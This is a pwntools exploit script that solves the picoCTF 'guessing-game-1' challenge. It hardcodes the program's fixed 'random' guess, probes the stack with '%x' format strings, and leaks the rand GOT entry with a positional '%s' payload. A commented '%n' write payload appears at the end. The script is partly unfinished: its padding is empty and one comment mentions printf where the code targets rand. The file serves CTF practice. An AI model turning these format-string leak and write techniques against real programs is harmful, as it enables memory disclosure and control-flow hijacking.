#!/usr/bin/env python3

"""
WhatTheFuzz's submission for the picoCTF challenge guessing-game-1
This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
"""

import struct
from pwn import *

exe = ELF("./vuln")

context.binary = exe
context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-e']

GDB_COMMAND = '''
file ./vuln
br * 0x804871a
'''
# This address contains the instrcution that compares the value of our input (stored in $eax) with what is stored on the stack ($ebp - 0x214)
COMPARE_ADDRESS = 0x804871a # cmp eax, dword ptr [ebp - 0x214]
NUM_CYCLIC_BYTES = 513

def get_rand_num():
    '''Open a debugger and get the value returned from the function
    `increment`. This is checked against the user's input. If the numbers match,
    we win!
    '''

    # I labored to get this to work with Python's gdb API such that is could be
    # done automatically. But the API sucks (I have to blame the API like all
    # good devs do). So to recreate this magic number, you can do the following:
    # gdb ./vuln
    # br * 0x804871a
    # Enter any number
    # x/d ($ebp-0x214) <- this is the value our input is checked against. This
    # should be -4015.
    return -4015


def find_input():
    '''Find where our input is on the stack. We need this because we will
    direct our `printf` call to read or write at this location.

    Returns an int representing the offset of our input on the stack.
    '''
    max_len_input = 39
    # We could do this one of two ways, with the debugger or by counting the
    # output.

    # Count the output.
    # We give the program a known string. We can then examine the output for
    # where the string appears.
    # We only need four bytes worth of characters to match on.
    known_string = cyclic(4)
    # |%x is the format string for hexadecimal with a pipe character
    # prefixing each address.
    name = known_string + max_len_input * b'|%x'

    with conn() as io:
        # Send the first answer.
        io.sendlineafter(b'What number would you like to guess?\n', str(get_rand_num()))
        # Send our format string to view how far our input is on the stack.
        io.sendlineafter(b'Name? ', name)
        stack_offset = 0
        # Find the offset of the string we sent.
        line = io.recvline_contains(b'Congrats: ')
        for i in line.split(b'|'):
            stack_offset += 1
            try:
                # Stop walking the stack when we find the string we sent.
                if binascii.unhexlify(i) == known_string:
                    break
            except:
                pass

        # We intentionally subtract one because the very first characters
        # printed will be our input before we have walked up the stack
        return stack_offset - 1

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        io = remote('jupiter.challenges.picoctf.org', 51462)

    else:
        io = process([exe.path])

    return io

def main():
    '''Return the flag.
    '''
    # Find how far our input is on the stack. This means that the first byte
    # we write will be located X addressed away from where the stack pointer is
    # located when we call `printf`. Thus if we use %x$n we can write to the location
    # we just wrote, assuming it is a valid address.
    offset = find_input()
    log.info(f'Our input is located {offset} addresses away from the stack pointer when printf is called.')

    # Find the addresses of some libc functions.
    # Get the address of `printf` in the global offset table. We want to overwrite this value to point to the first instruction of our ropchain.
    got_rand = exe.got['rand']
    log.info(f'The address of rand stored in the GOT is: {hex(got_rand)}')

    # Create the name we will send to the program to start off our ROP chain.
    name = b''

    # The address we want to read.
    name += p32(exe.got['rand'])

    # The amount of padding we need to write. This should be equal to the address of the first instruction of our ROP chain.
    name += b''

    # Inform printf that we want the argument from the stack that lies at our known offset. See man 3 printf.
    name += b'%' + str(offset).encode() + b'$s'

    log.info(f'The format string that we will pass to the program is: {name}')

    # Launch our program and send our format string.
    with conn() as io:
        # Send the first answer, which isn't really a 'random' number.
        io.sendlineafter(b'What number would you like to guess?\n', str(get_rand_num()))

        io.sendlineafter(b'Name? ', name)
        io.recvuntil(b'Congrats: ')
        addr = io.recvline(keepends=False)
        print(addr)


if __name__ == "__main__":
    main()


# \xc8\x9f\x04\x08aaaa%7$n
#0x8049fc8
